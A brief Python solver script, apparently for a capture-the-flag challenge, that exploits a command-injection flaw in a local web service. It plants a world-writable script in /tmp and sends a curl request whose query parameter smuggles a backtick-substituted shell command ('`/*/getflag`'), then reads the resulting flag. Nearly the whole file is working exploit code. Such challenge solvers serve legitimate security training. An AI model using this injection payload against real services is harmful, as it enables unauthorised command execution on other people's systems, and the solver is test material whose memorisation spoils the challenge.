from solver.utils import extract_flag

def solve(connection):
	connection.exec("echo 'getflag > /tmp/flag' > /tmp/GETFLAG && chmod 777 /tmp/GETFLAG")
	connection.exec("curl localhost:4646/?x='`/*/getflag`'")
	flag = extract_flag(connection.exec("cat /tmp/flag"))
	return "", flag